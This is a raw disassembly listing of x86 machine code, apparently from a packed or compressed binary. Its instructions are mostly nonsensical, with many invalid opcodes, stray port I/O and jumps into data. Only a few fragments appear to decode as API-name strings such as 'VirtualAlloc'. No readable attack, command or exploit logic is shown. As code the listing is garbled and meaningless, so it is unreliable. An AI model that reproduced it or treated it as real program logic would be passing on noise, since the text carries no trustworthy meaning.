  418d04:	c8 03 14 67          	enter  $0x1403,$0x67
  418d08:	5e                   	pop    %esi
  418d09:	a3 3b bd ae 6b       	mov    %eax,0x6baebd3b
  418d0e:	9e                   	sahf
  418d0f:	cb                   	lret
  418d10:	1c d0                	sbb    $0xd0,%al
  418d12:	1b a4 47 34 f7 d3 f4 	sbb    -0xb2c08cc(%edi,%eax,2),%esp
  418d19:	4e                   	dec    %esi
  418d1a:	da 07                	fiaddl (%edi)
  418d1c:	d4 5d                	aam    $0x5d
  418d1e:	c3                   	ret
  418d1f:	ec                   	in     (%dx),%al
  418d20:	db fb                	(bad)
  418d22:	3c 88                	cmp    $0x88,%al
  418d24:	27                   	daa
  418d25:	ed                   	in     (%dx),%eax
  418d26:	4e                   	dec    %esi
  418d27:	14 0f                	adc    $0xf,%al
  418d29:	74 5e                	je     0x418d89
  418d2b:	f7 28                	imull  (%eax)
  418d2d:	9b                   	fwait
  418d2e:	44                   	inc    %esp
  418d2f:	01 a8 c0 7f 80 40    	add    %ebp,0x40807fc0(%eax)
  418d35:	10 91 61 b6 a0 a0    	adc    %dl,-0x5f5f499f(%ecx)
  418d3b:	40                   	inc    %eax
  418d3c:	4b                   	dec    %ebx
  418d3d:	03 f9                	add    %ecx,%edi
  418d3f:	11 14 11             	adc    %edx,(%ecx,%edx,1)
  418d42:	20 41 00             	and    %al,0x0(%ecx)
  418d45:	0c 05                	or     $0x5,%al
  418d47:	08 f4                	or     %dh,%ah
  418d49:	b2 cc                	mov    $0xcc,%dl
  418d4b:	04 10                	add    $0x10,%al
  418d4d:	30 41 75             	xor    %al,0x75(%ecx)
  418d50:	08 21                	or     %ah,(%ecx)
  418d52:	52                   	push   %edx
  418d53:	04 99                	add    $0x99,%al
  418d55:	44                   	inc    %esp
  418d56:	58                   	pop    %eax
  418d57:	80 8a 03 37 ff 0f 40 	orb    $0x40,0xfff3703(%edx)
  418d5e:	06                   	push   %es
  418d5f:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  418d63:	00 43 00             	add    %al,0x0(%ebx)
  418d66:	4c                   	dec    %esp
  418d67:	00 41 0b             	add    %al,0xb(%ecx)
  418d6a:	00 50 e8             	add    %dl,-0x18(%eax)
  418d6d:	ff 66 73             	jmp    *0x73(%esi)
  418d70:	07                   	pop    %es
  418d71:	0d 4b 47 00 45       	or     $0x4500474b,%eax
  418d76:	00 49 00             	add    %cl,0x0(%ecx)
  418d79:	4e                   	dec    %esi
  418d7a:	00 46 00             	add    %al,0x0(%esi)
  418d7d:	4f                   	dec    %edi
  418d7e:	fe                   	(bad)
  418d7f:	6f                   	outsl  %ds:(%esi),(%dx)
  418d80:	05 e5 c7 39 00       	add    $0x39c7e5,%eax
  418d85:	61                   	popa
  418d86:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  418d8a:	00 72 00             	add    %dh,0x0(%edx)
  418d8d:	64 75 dd             	fs jne 0x418d6d
  418d90:	e6 ee                	out    %al,$0xee
  418d92:	09 79 00             	or     %edi,0x0(%ecx)
  418d95:	1a 27                	sbb    (%edi),%ah
  418d97:	07                   	pop    %es
  418d98:	6e                   	outsb  %ds:(%esi),(%dx)
  418d99:	01 6f 17             	add    %ebp,0x17(%edi)
  418d9c:	20 b7 3d 77 d7 0b    	and    %dh,0xbd7773d(%edi)
  418da2:	73 01                	jae    0x418da5
  418da4:	69 00 67 11 0d 03    	imul   $0x30d1167,(%eax),%eax
  418daa:	25 0f 43 36 60       	and    $0x6036430f,%eax
  418daf:	5d                   	pop    %ebp
  418db0:	20 1b                	and    %bl,(%ebx)
  418db2:	6f                   	outsl  %ds:(%esi),(%dx)
  418db3:	0f 15 35 63 58 d7 8d 	unpckhps 0x8dd75863,%xmm6
  418dba:	75 4f                	jne    0x418e0b
  418dbc:	65 59                	gs pop %ecx
  418dbe:	65 0d 66 3f 6c 09    	gs or  $0x96c3f66,%eax
  418dc4:	ac                   	lods   %ds:(%esi),%al
  418dc5:	79 48                	jns    0x418e0f
  418dc7:	be 2b 13 6f 00       	mov    $0x6f132b,%esi
  418dcc:	70 6e                	jo     0x418e3c
  418dce:	27                   	daa
  418dcf:	e6 06                	out    %al,$0x6
  418dd1:	eb a6                	jmp    0x418d79
  418dd3:	11 9b 74 47 6d 13    	adc    %ebx,0x136d4774(%ebx)
  418dd9:	09 ac eb 36 73 64 07 	or     %ebp,0x7647336(%ebx,%ebp,8)
  418de0:	72 01                	jb     0x418de3
  418de2:	6f                   	outsl  %ds:(%esi),(%dx)
  418de3:	03 12                	add    (%edx),%edx
  418de5:	23 4c d8 eb          	and    -0x15(%eax,%ebx,8),%ecx
  418de9:	86 77 0b             	xchg   %dh,0xb(%edi)
  418dec:	69 75 25 1d eb ba cf 	imul   $0xcfbaeb1d,0x25(%ebp),%esi
  418df3:	35 03 69 51 6d       	xor    $0x6d516903,%eax
  418df8:	69 69 64 1b 78 79 17 	imul   $0x1779781b,0x64(%ecx),%ebp
  418dff:	eb 06                	jmp    0x418e07
  418e01:	1b 75 81             	sbb    -0x7f(%ebp),%esi
  418e04:	66 05 62 0f          	add    $0xf62,%ax
  418e08:	1d cb cc e6 be       	sbb    $0xbee6cccb,%eax
  418e0d:	df 28                	fildll (%eax)
  418e0f:	83 09 29             	orl    $0x29,(%ecx)
  418e12:	3b 02                	cmp    (%edx),%eax
  418e14:	1b eb                	sbb    %ebx,%ebp
  418e16:	ba 63 65 70 03       	mov    $0x3706563,%edx
  418e1b:	63 63 79             	arpl   %esp,0x79(%ebx)
  418e1e:	41                   	inc    %ecx
  418e1f:	60                   	pusha
  418e20:	67 09 19             	or     %ebx,(%bx,%di)
  418e23:	1d 21 74 3b 74       	sbb    $0x743b7421,%eax
  418e28:	63 0d 43 2b a5 70    	arpl   %ecx,0x70a52b43
  418e2e:	c9                   	leave
  418e2f:	61                   	popa
  418e30:	2b 69 d7             	sub    -0x29(%ecx),%ebp
  418e33:	5d                   	pop    %ebp
  418e34:	c2 c1 27             	ret    $0x27c1
  418e37:	9b                   	fwait
  418e38:	6c                   	insb   (%dx),%es:(%edi)
  418e39:	01 6f f5             	add    %ebp,-0xb(%edi)
  418e3c:	6c                   	insb   (%dx),%es:(%edi)
  418e3d:	ec                   	in     (%dx),%al
  418e3e:	2c 42                	sub    $0x42,%al
  418e40:	65 17                	gs pop %ss
  418e42:	1d 73 f3 74 13       	sbb    $0x1374f373,%eax
  418e47:	66 dd c8             	data16 (bad)
  418e4a:	17                   	pop    %ss
  418e4b:	f5                   	cmc
  418e4c:	72 67                	jb     0x418eb5
  418e4e:	0d 6c 89 33 5b       	or     $0x5b33896c,%eax
  418e53:	02 eb                	add    %bl,%ch
  418e55:	5d                   	pop    %ebp
  418e56:	53                   	push   %ebx
  418e57:	17                   	pop    %ss
  418e58:	3d 64 39 cf 7d       	cmp    $0x7dcf3964,%eax
  418e5d:	09 6c 73 65          	or     %ebp,0x65(%ebx,%esi,2)
  418e61:	1d 75 8f 2d 6c       	sbb    $0x6c2d8f75,%eax
  418e66:	73 7c                	jae    0x418ee4
  418e68:	b1 63                	mov    $0x63,%cl
  418e6a:	91                   	xchg   %eax,%ecx
  418e6b:	29 16                	sub    %edx,(%esi)
  418e6d:	4f                   	dec    %edi
  418e6e:	2b 76 27             	sub    0x27(%esi),%esi
  418e71:	61                   	popa
  418e72:	16                   	push   %ss
  418e73:	61                   	popa
  418e74:	6c                   	insb   (%dx),%es:(%edi)
  418e75:	69 73 70 77 b7 27 4d 	imul   $0x4d27b777,0x70(%ebx),%esi
  418e7c:	59                   	pop    %ecx
  418e7d:	77 36                	ja     0x418eb5
  418e7f:	1d 75 11 1a 2d       	sbb    $0x2d1a1175,%eax
  418e84:	64 4e                	fs dec %esi
  418e86:	f7 de                	neg    %esi
  418e88:	e3 49                	jecxz  0x418ed3
  418e8a:	49                   	dec    %ecx
  418e8b:	2b 35 c3 66 46 47    	sub    0x474666c3,%esi
  418e91:	f7 e8                	imul   %eax
  418e93:	07                   	pop    %es
  418e94:	27                   	daa
  418e95:	09 05 17 af 61 1d    	or     %eax,0x1d61af17
  418e9b:	9b                   	fwait
  418e9c:	32 66 0c             	xor    0xc(%esi),%ah
  418e9f:	64 7d 65             	fs jge 0x418f07
  418ea2:	6b 05 6e 02 fb 9e 6b 	imul   $0x6b,0x9efb026e,%eax
  418ea9:	31 1b                	xor    %ebx,(%ebx)
  418eab:	2f                   	das
  418eac:	73 0d                	jae    0x418ebb
  418eae:	08 5b d9             	or     %bl,-0x27(%ebx)
  418eb1:	b2 74                	mov    $0x74,%dl
  418eb3:	71 67                	jno    0x418f1c
  418eb5:	37                   	aaa
  418eb6:	1c 65                	sbb    $0x65,%al
  418eb8:	a9 64 67 00 07       	test   $0x7006764,%eax
  418ebd:	6b 3a 8c             	imul   $0xffffff8c,(%edx),%edi
  418ec0:	35 c7 63 4d 62       	xor    $0x624d63c7,%eax
  418ec5:	15 77 4e 0b b0       	adc    $0xb00b4e77,%eax
  418eca:	6e                   	outsb  %ds:(%esi),(%dx)
  418ecb:	b2 a6                	mov    $0xa6,%dl
  418ecd:	76 6d                	jbe    0x418f3c
  418ecf:	11 44 07 63          	adc    %eax,0x63(%edi,%eax,1)
  418ed3:	11 87 ed 61 18 03    	adc    %eax,0x31861ed(%edi)
  418ed9:	a3 11 07 4d d9       	mov    %eax,0xd94d0711
  418ede:	be 58 d3 74 0f       	mov    $0xf74d358,%esi
  418ee3:	54                   	push   %esp
  418ee4:	65 57                	gs push %edi
  418ee6:	9d                   	popf
  418ee7:	0f 68 ec             	punpckhbw %mm4,%mm5
  418eea:	7b a6                	jnp    0x418e92
  418eec:	eb 11                	jmp    0x418eff
  418eee:	03 b3 72 2f 9f 06    	add    0x69f2f72(%ebx),%esi
  418ef4:	37                   	aaa
  418ef5:	9b                   	fwait
  418ef6:	ec                   	in     (%dx),%al
  418ef7:	9d                   	popf
  418ef8:	14 cf                	adc    $0xcf,%al
  418efa:	06                   	push   %es
  418efb:	3d 0d 07 43 6c       	cmp    $0x6c43070d,%eax
  418f00:	b0 c1                	mov    $0xc1,%al
  418f02:	06                   	push   %es
  418f03:	73 0f                	jae    0x418f14
  418f05:	09 4b 6e             	or     %ecx,0x6e(%ebx)
  418f08:	13 6c b2 c1          	adc    -0x3f(%edx,%esi,4),%ebp
  418f0c:	06                   	push   %es
  418f0d:	08 57 72             	or     %dl,0x72(%edi)
  418f10:	11 06                	adc    %eax,(%esi)
  418f12:	61                   	popa
  418f13:	b2 a5                	mov    $0xa5,%dl
  418f15:	b2 d9                	mov    $0xd9,%dl
  418f17:	0d eb b7 4a f7       	or     $0xf74ab7eb,%eax
  418f1c:	9a e6 0b 07 6c 41 67 	lcall  $0x6741,$0x6c070be6
  418f23:	9f                   	lahf
  418f24:	65 1b 84 13 5c 70 07 	sbb    %gs:0xb07705c(%ebx,%edx,1),%eax
  418f2b:	0b 
  418f2c:	03 03                	add    (%ebx),%eax
  418f2e:	03 f9                	add    %ecx,%edi
  418f30:	b1 ae                	mov    $0xae,%cl
  418f32:	e9 06 07 37 61       	jmp    0x6178963d
  418f37:	75 05                	jne    0x418f3e
  418f39:	72 87                	jb     0x418ec2
  418f3b:	cf                   	iret
  418f3c:	1d e6 ba 46 17       	sbb    $0x1746bae6,%eax
  418f41:	62 0b                	bound  %ecx,(%ebx)
  418f43:	11 05 cb 09 c3 e1    	adc    %eax,0xe1c309cb
  418f49:	e1 ba                	loope  0x418f05
  418f4b:	63 9f 05 55 67 ab    	arpl   %ebx,-0x5498aafb(%edi)
  418f51:	21 6c b0 c1          	and    %ebp,-0x3f(%eax,%esi,4)
  418f55:	be 99 04 79 65       	mov    $0x65790499,%esi
  418f5a:	09 6c bb 0c          	or     %ebp,0xc(%ebx,%edi,4)
  418f5e:	36 c6                	ss (bad)
  418f60:	59                   	pop    %ecx
  418f61:	7d 75                	jge    0x418fd8
  418f63:	df 09                	fisttps (%ecx)
  418f65:	83 74 6d a4 b2       	xorl   $0xffffffb2,-0x5c(%ebp,%ebp,2)
  418f6a:	25 67 cf 7b 56       	and    $0x567bcf67,%eax
  418f6f:	90                   	nop
  418f70:	34 eb                	xor    $0xeb,%al
  418f72:	8d 75 69             	lea    0x69(%ebp),%esi
  418f75:	9d                   	popf
  418f76:	43                   	inc    %ebx
  418f77:	1f                   	pop    %ds
  418f78:	b2 ef                	mov    $0xef,%dl
  418f7a:	35 81 19 6d 85       	xor    $0x856d1981,%eax
  418f7f:	21 2f                	and    %ebp,(%edi)
  418f81:	8e c0                	mov    %eax,%es
  418f83:	5a                   	pop    %edx
  418f84:	96                   	xchg   %eax,%esi
  418f85:	1b 7f 15             	sbb    0x15(%edi),%edi
  418f88:	4c                   	dec    %esp
  418f89:	d3 bd 06 a5 78 a5    	sarl   %cl,-0x5a875afa(%ebp)
  418f8f:	39 6e 6c             	cmp    %ebp,0x6c(%esi)
  418f92:	75 93                	jne    0x418f27
  418f94:	35 fb 33 63 bd       	xor    $0xbd6333fb,%eax
  418f99:	09 25 13 10 e3 b2    	or     %esp,0xb2e31013
  418f9f:	77 c0                	ja     0x418f61
  418fa1:	e1 a3                	loope  0x418f46
  418fa3:	2b 19                	sub    (%ecx),%ebx
  418fa5:	66 c7                	data16 (bad)
  418fa7:	bd 59 a4 01 17       	mov    $0x1701a459,%ebp
  418fac:	73 4d                	jae    0x418ffb
  418fae:	17                   	pop    %ss
  418faf:	b0 46                	mov    $0x46,%al
  418fb1:	ba ec 45 bf 73       	mov    $0x73bf45ec,%edx
  418fb6:	d3 70 35             	shll   %cl,0x35(%eax)
  418fb9:	de 4b d9             	fimuls -0x27(%ebx)
  418fbc:	1b 1c 7d 6b b9 2d 69 	sbb    0x692db96b(,%edi,2),%ebx
  418fc3:	9a 75 d8 3f 66 af 17 	lcall  $0x17af,$0x663fd875
  418fca:	1d 6d 6f 96 b9       	sbb    $0xb9966f6d,%eax
  418fcf:	1b 68 91             	sbb    -0x6f(%eax),%ebp
  418fd2:	64 00 10             	add    %dl,%fs:(%eax)
  418fd5:	bf 07 9d 15 1b       	mov    $0x1b159d07,%edi
  418fda:	ac                   	lods   %ds:(%esi),%al
  418fdb:	2c 59                	sub    $0x59,%al
  418fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  418fde:	6f                   	outsl  %ds:(%esi),(%dx)
  418fdf:	d1 0e                	rorl   $1,(%esi)
  418fe1:	c0 f7 82             	shl    $0x82,%bh
  418fe4:	d5 ad                	aad    $0xad
  418fe6:	62 95 89 81 45 d7    	bound  %edx,-0x28ba7e77(%ebp)
  418fec:	8b 75 93             	mov    -0x6d(%ebp),%esi
  418fef:	a9 3f 1d 63 79       	test   $0x79631d3f,%eax
  418ff4:	d1 37                	shll   $1,(%edi)
  418ff6:	be 97 b0 be 7d       	mov    $0x7dbeb097,%esi
  418ffb:	6c                   	insb   (%dx),%es:(%edi)
  418ffc:	fd                   	std
  418ffd:	0b 05 64 4d b6 25    	or     0x25b64d64,%eax
  419003:	eb 01                	jmp    0x419006
  419005:	72 29                	jb     0x419030
  419007:	5d                   	pop    %ebp
  419008:	70 a3                	jo     0x418fad
  41900a:	6d                   	insl   (%dx),%es:(%edi)
  41900b:	ac                   	lods   %ds:(%esi),%al
  41900c:	4b                   	dec    %ebx
  41900d:	8a 8d 8b 75 fd a3    	mov    -0x5c028a75(%ebp),%cl
  419013:	2e 1b a6 21 6c c2 6f 	sbb    %cs:0x6fc26c21(%esi),%esp
  41901a:	41                   	inc    %ecx
  41901b:	1a 0f                	sbb    (%edi),%cl
  41901d:	6c                   	insb   (%dx),%es:(%edi)
  41901e:	2f                   	das
  41901f:	61                   	popa
  419020:	7f 43                	jg     0x419065
  419022:	33 00                	xor    (%eax),%eax
  419024:	32 97 3b 57 43 66    	xor    0x6643573b(%edi),%dl
  41902a:	75 b3                	jne    0x418fdf
  41902c:	ee                   	out    %al,(%dx)
  41902d:	2f                   	das
  41902e:	3a cd                	cmp    %ch,%cl
  419030:	15 0a 6d 30 6c       	adc    $0x6c306d0a,%eax
  419035:	09 eb                	or     %ebp,%ebx
  419037:	b5 20                	mov    $0x20,%ch
  419039:	39 0f                	cmp    %ecx,(%edi)
  41903b:	50                   	push   %eax
  41903c:	73 29                	jae    0x419067
  41903e:	84 f0                	test   %dh,%al
  419040:	70 85                	jo     0x418fc7
  419042:	d1 63 97             	shll   $1,-0x69(%ebx)
  419045:	29 d3                	sub    %edx,%ebx
  419047:	8c 19                	mov    %ds,(%ecx)
  419049:	e7 61                	out    %eax,$0x61
  41904b:	e9 c7 f9 2a 4b       	jmp    0x4b6c8a17
  419050:	c6                   	(bad)
  419051:	8c db                	mov    %ds,%ebx
  419053:	d7                   	xlat   %ds:(%ebx)
  419054:	00 c2                	add    %al,%dl
  419056:	1b 40 e0             	sbb    -0x20(%eax),%eax
  419059:	19 83 6f 8f f5 04    	sbb    %eax,0x4f58f6f(%ebx)
  41905f:	52                   	push   %edx
  419060:	06                   	push   %es
  419061:	6f                   	outsl  %ds:(%esi),(%dx)
  419062:	f3 47                	repz inc %edi
  419064:	b7 04                	mov    $0x4,%bh
  419066:	0e                   	push   %cs
  419067:	11 ae 63 69 0d 8b    	adc    %ebp,-0x74f2969d(%esi)
  41906d:	28 e1                	sub    %ah,%cl
  41906f:	e1 b0                	loope  0x419021
  419071:	e7 ad                	out    %eax,$0xad
  419073:	30 99 18 1c 80 90    	xor    %bl,-0x6f7fe3e8(%ecx)
  419079:	7b 0e                	jnp    0x419089
  41907b:	93                   	xchg   %eax,%ebx
  41907c:	10 8c b1 8f 13 6b 27 	adc    %cl,0x276b138f(%ecx,%esi,4)
  419083:	76 af                	jbe    0x419034
  419085:	c6                   	(bad)
  419086:	be 08 67 7b 0d       	mov    $0xd7b6708,%esi
  41908b:	7d cf                	jge    0x41905c
  41908d:	72 77                	jb     0x419106
  41908f:	2d a4 ee c4 e6       	sub    $0xe6c4eea4,%eax
  419094:	0f 25                	(bad)
  419096:	68 89 c9 50 6f       	push   $0x6f50c989
  41909b:	f7 0e 1c 5e 93 59    	testl  $0x59935e1c,(%esi)
  4190a1:	af                   	scas   %es:(%edi),%eax
  4190a2:	cf                   	iret
  4190a3:	ff 8c 01 e1 8c 69 75 	decl   0x75698ce1(%ecx,%eax,1)
  4190aa:	83 25 dd b6 c0 78 09 	andl   $0x9,0x78c0b6dd
  4190b1:	9d                   	popf
  4190b2:	3f                   	aas
  4190b3:	19 8b c8 d9 6c db    	sbb    %ecx,-0x24932638(%ebx)
  4190b9:	cb                   	lret
  4190ba:	0a a3 65 4b e2 30    	or     0x30e24b65(%ebx),%ah
  4190c0:	a9 11 4f de 67       	test   $0x67de4f11,%eax
  4190c5:	b8 8c 3b 31 dd       	mov    $0xdd313b8c,%eax
  4190ca:	07                   	pop    %es
  4190cb:	6d                   	insl   (%dx),%es:(%edi)
  4190cc:	1f                   	pop    %ds
  4190cd:	17                   	pop    %ss
  4190ce:	12 de                	adc    %dh,%bl
  4190d0:	32 8f 6d 7f 25 ce    	xor    -0x31da8093(%edi),%cl
  4190d6:	dc 17                	fcoml  (%edi)
  4190d8:	b3 15                	mov    $0x15,%bl
  4190da:	27                   	daa
  4190db:	6d                   	insl   (%dx),%es:(%edi)
  4190dc:	57                   	push   %edi
  4190dd:	51                   	push   %ecx
  4190de:	62 15 ac b1 c1 89    	bound  %edx,0x89c1b1ac
  4190e4:	77 ed                	ja     0x4190d3
  4190e6:	68 51 16 69 e0       	push   $0xe0691651
  4190eb:	e9 d3 7b 6e 4b       	jmp    0x4bb00cc3
  4190f0:	1b 17                	sbb    (%edi),%edx
  4190f2:	02 bb 0c 56 a9 66    	add    0x66a9560c(%ebx),%bh
  4190f8:	83 84 ac 29 63 1f 03 	addl   $0x76,0x31f6329(%esp,%ebp,4)
  4190ff:	76 
  419100:	bb 7b 78 6f 49       	mov    $0x496f787b,%ebx
  419105:	93                   	xchg   %eax,%ebx
  419106:	93                   	xchg   %eax,%ebx
  419107:	2b 95 73 e7 95 91    	sub    -0x6e6a188d(%ebp),%edx
  41910d:	ca 06 19             	lret   $0x1906
  419110:	3f                   	aas
  419111:	77 0e                	ja     0x419121
  419113:	ac                   	lods   %ds:(%esi),%al
  419114:	94                   	xchg   %eax,%esp
  419115:	c0 22 1f             	shlb   $0x1f,(%edx)
  419118:	41                   	inc    %ecx
  419119:	20 40 22             	and    %al,0x22(%eax)
  41911c:	6b b2 59 73 a3 21 d3 	imul   $0xffffffd3,0x21a37359(%edx),%esi
  419123:	60                   	pusha
  419124:	b4 e1                	mov    $0xe1,%ah
  419126:	52                   	push   %edx
  419127:	0f 05                	syscall
  419129:	79 f5                	jns    0x419120
  41912b:	84 c5                	test   %al,%ch
  41912d:	12 0e                	adc    (%esi),%cl
  41912f:	1c 77                	sbb    $0x77,%al
  419131:	1f                   	pop    %ds
  419132:	29 04 0e             	sub    %eax,(%esi,%ecx,1)
  419135:	8b e7                	mov    %edi,%esp
  419137:	76 99                	jbe    0x4190d2
  419139:	10 d8                	adc    %bl,%al
  41913b:	58                   	pop    %eax
  41913c:	65 00 81 4f af c3 07 	add    %al,%gs:0x7c3af4f(%ecx)
  419143:	8f                   	(bad)
  419144:	97                   	xchg   %eax,%edi
  419145:	b5 29                	mov    $0x29,%ch
  419147:	99                   	cltd
  419148:	0c 07                	or     $0x7,%al
  41914a:	7c 0c                	jl     0x419158
  41914c:	8c 5c 2f 1f          	mov    %ds,0x1f(%edi,%ebp,1)
  419150:	75 d5                	jne    0x419127
  419152:	64 81 cb 82 d1 46 95 	fs or  $0x9546d182,%ebx
  419159:	cd 66                	int    $0x66
  41915b:	e9 21 95 12 26       	jmp    0x26542681
  419160:	10 3f                	adc    %bh,(%edi)
  419162:	03 ba a5 de 81 f5    	add    -0xa7e215b(%edx),%edi
  419168:	61                   	popa
  419169:	2d 54 6f 6f 48       	sub    $0x486f6f54,%eax
  41916e:	20 f5                	and    %dh,%ch
  419170:	45                   	inc    %ebp
  419171:	b5 79                	mov    $0x79,%ch
  419173:	31 26                	xor    %esp,(%esi)
  419175:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  419176:	01 5b 1f             	add    %ebx,0x1f(%ebx)
  419179:	12 67 61             	adc    0x61(%edi),%ah
  41917c:	a9 64 50 92 11       	test   $0x11925064,%eax
  419181:	c6                   	(bad)
  419182:	2b 69 35             	sub    0x35(%ecx),%ebp
  419185:	17                   	pop    %ss
  419186:	ec                   	in     (%dx),%al
  419187:	cd 22                	int    $0x22
  419189:	b2 2f                	mov    $0x2f,%dl
  41918b:	62 1b                	bound  %ebx,(%ebx)
  41918d:	b7 07                	mov    $0x7,%bh
  41918f:	81 89 cb de db 57 09 	orl    $0x1eca9b09,0x57dbdecb(%ecx)
  419196:	9b ca 1e 
  419199:	82 f5 ed             	xor    $0xed,%ch
  41919c:	6b cb 97             	imul   $0xffffff97,%ebx,%ecx
  41919f:	15 b3 60 3c 04       	adc    $0x43c60b3,%eax
  4191a4:	63 6e 71             	arpl   %ebp,0x71(%esi)
  4191a7:	59                   	pop    %ecx
  4191a8:	63 c1                	arpl   %eax,%ecx
  4191aa:	19 a7 37 c2 70 2b    	sbb    %esp,0x2b70c237(%edi)
  4191b0:	10 3f                	adc    %bh,(%edi)
  4191b2:	97                   	xchg   %eax,%edi
  4191b3:	31 e4                	xor    %esp,%esp
  4191b5:	ee                   	out    %al,(%dx)
  4191b6:	7d 2f                	jge    0x4191e7
  4191b8:	77 c3                	ja     0x41917d
  4191ba:	7a 2f                	jp     0x4191eb
  4191bc:	d7                   	xlat   %ds:(%ebx)
  4191bd:	11 00                	adc    %eax,(%eax)
  4191bf:	52                   	push   %edx
  4191c0:	84 b1 06 63 67 63    	test   %dh,0x63676306(%ecx)
  4191c6:	68 73 6b 49 d6       	push   $0xd6496b73
  4191cb:	97                   	xchg   %eax,%edi
  4191cc:	0c 26                	or     $0x26,%al
  4191ce:	10 bf 25 72 1d f0    	adc    %bh,-0xfe28ddb(%edi)
  4191d4:	56                   	push   %esi
  4191d5:	c2 00 20             	ret    $0x2000
  4191d8:	47                   	inc    %edi
  4191d9:	19 84 31 81 84 fb 11 	sbb    %eax,0x11fb8481(%ecx,%esi,1)
  4191e0:	95                   	xchg   %eax,%ebp
  4191e1:	b2 89                	mov    $0x89,%dl
  4191e3:	6c                   	insb   (%dx),%es:(%edi)
  4191e4:	69 09 46 31 64 c7    	imul   $0xc7643146,(%ecx),%ecx
  4191ea:	47                   	inc    %edi
  4191eb:	16                   	push   %ss
  4191ec:	ca 86 17             	lret   $0x1786
  4191ef:	3f                   	aas
  4191f0:	b1 18                	mov    $0x18,%cl
  4191f2:	81 cd 08 65 2f 1f    	or     $0x1f2f6508,%ebp
  4191f8:	31 fe                	xor    %edi,%esi
  4191fa:	ff 8f b2 00 26 3d    	decl   0x3d2600b2(%edi)
  419200:	4f                   	dec    %edi
  419201:	38 c2                	cmp    %al,%dl
  419203:	82 37 b8             	xorb   $0xb8,(%edi)
  419206:	f3 24 42             	repz and $0x42,%al
  419209:	03 17                	add    (%edi),%edx
  41920b:	9b                   	fwait
  41920c:	3a 83 01 2a b8 4d    	cmp    0x4db82a01(%ebx),%al
  419212:	36 b7 cc             	ss mov $0xcc,%bh
  419215:	00 01                	add    %al,(%ecx)
  419217:	37                   	aaa
  419218:	2d 13 50 34 bc       	sub    $0xbc345013,%eax
  41921d:	6b 8c b8 b9 0a fa 10 	imul   $0xffffffdd,0x10fa0ab9(%eax,%edi,4),%ecx
  419224:	dd 
  419225:	49                   	dec    %ecx
  419226:	6e                   	outsb  %ds:(%esi),(%dx)
  419227:	69 45 c9 10 c7 28 6e 	imul   $0x6e28c710,-0x37(%ebp),%eax
  41922e:	b7 20                	mov    $0x20,%bh
  419230:	02 73 74             	add    0x74(%ebx),%dh
  419233:	08 00                	or     %al,(%eax)
  419235:	c7                   	(bad)
  419236:	37                   	aaa
  419237:	e7 06                	out    %eax,$0x6
  419239:	09 4c 81 08          	or     %ecx,0x8(%ecx,%eax,4)
  41923d:	1f                   	pop    %ds
  41923e:	81 0c 4b 9b 6d 02 05 	orl    $0x5026d9b,(%ebx,%ecx,2)
  419245:	ef                   	out    %eax,(%dx)
  419246:	13 02                	adc    (%edx),%eax
  419248:	55                   	push   %ebp
  419249:	74 da                	je     0x419225
  41924b:	62 ae 6b 31 30 9d    	bound  %ebp,-0x62cfce95(%esi)
  419251:	0a 33                	or     (%ebx),%dh
  419253:	0a 5e f9             	or     -0x7(%esi),%bl
  419256:	6f                   	outsl  %ds:(%esi),(%dx)
  419257:	13 20                	adc    (%eax),%esp
  419259:	c3                   	ret
  41925a:	09 51 54             	or     %edx,0x54(%ecx)
  41925d:	79 70                	jns    0x4192cf
  41925f:	49                   	dec    %ecx
  419260:	6e                   	outsb  %ds:(%esi),(%dx)
  419261:	66 6f                	outsw  %ds:(%esi),(%dx)
  419263:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  419264:	11 08                	adc    %ecx,(%eax)
  419266:	60                   	pusha
  419267:	73 e0                	jae    0x419249
  419269:	58                   	pop    %eax
  41926a:	87 a3 88 dd db 33    	xchg   %esp,0x33dbdd88(%ebx)
  419270:	4d                   	dec    %ebp
  419271:	19 73 61             	sbb    %esi,0x61(%ebx)
  419274:	67 1e                	addr16 push %ds
  419276:	00 38                	add    %bh,(%eax)
  419278:	58                   	pop    %eax
  419279:	05 11 42 05 37       	add    $0x37054211,%eax
  41927e:	24 28                	and    $0x28,%al
  419280:	c8 56 03 76          	enter  $0x356,$0x76
  419284:	33 40 94             	xor    -0x6c(%eax),%eax
  419287:	8c b4 00 01 01 40 44 	mov    %?,0x44400101(%eax,%eax,1)
  41928e:	2b aa 6c db b1 80    	sub    -0x7f4e2494(%edx),%ebp
  419294:	9a ef a4 49 64 15 44 	lcall  $0x4415,$0x6449a4ef
  41929b:	62 03                	bound  %eax,(%ebx)
  41929d:	8a cb                	mov    %bl,%cl
  41929f:	65 6c                	gs insb (%dx),%es:(%edi)
  4192a1:	65 43                	gs inc %ebx
  4192a3:	22 69 b1             	and    -0x4f(%ecx),%ch
  4192a6:	a0 d8 02 45 53       	mov    0x534502d8,%al
  4192ab:	de 14 57             	ficoms (%edi,%edx,2)
  4192ae:	b6 6d                	mov    $0x6d,%dh
  4192b0:	16                   	push   %ss
  4192b1:	4c                   	dec    %esp
  4192b2:	1e                   	push   %ds
  4192b3:	76 15                	jbe    0x4192ca
  4192b5:	45                   	inc    %ebp
  4192b6:	5d                   	pop    %ebp
  4192b7:	90                   	nop
  4192b8:	32 17                	xor    (%edi),%dl
  4192ba:	6d                   	insl   (%dx),%es:(%edi)
  4192bb:	15 62 69 d5 fe       	adc    $0xfed56962,%eax
  4192c0:	ca 6e 0f             	lret   $0xf6e
  4192c3:	69 7a 30 56 69 72 74 	imul   $0x74726956,0x30(%edx),%edi
  4192ca:	75 0f                	jne    0x4192db
  4192cc:	ee                   	out    %al,(%dx)
  4192cd:	27                   	daa
  4192ce:	73 45                	jae    0x419315
  4192d0:	de 0c 41             	fimuls (%ecx,%eax,2)
  4192d3:	6c                   	insb   (%dx),%es:(%edi)
  4192d4:	6c                   	insb   (%dx),%es:(%edi)
  4192d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4192d6:	63 61 d9             	arpl   %esp,-0x27(%ecx)
  4192d9:	ec                   	in     (%dx),%al
  4192da:	0d 6b 04 18 0a       	or     $0xa18046b,%eax
  4192df:	16                   	push   %ss
  4192e0:	24 80                	and    $0x80,%al
  4192e2:	68 2f 3f 51 75       	push   $0x75513f2f
  4192e7:	65 72 79             	gs jb  0x419363
  4192ea:	57                   	push   %edi
  4192eb:	69 64 54 fd 40 01 b7 	imul   $0x93b70140,-0x3(%esp,%edx,2),%esp
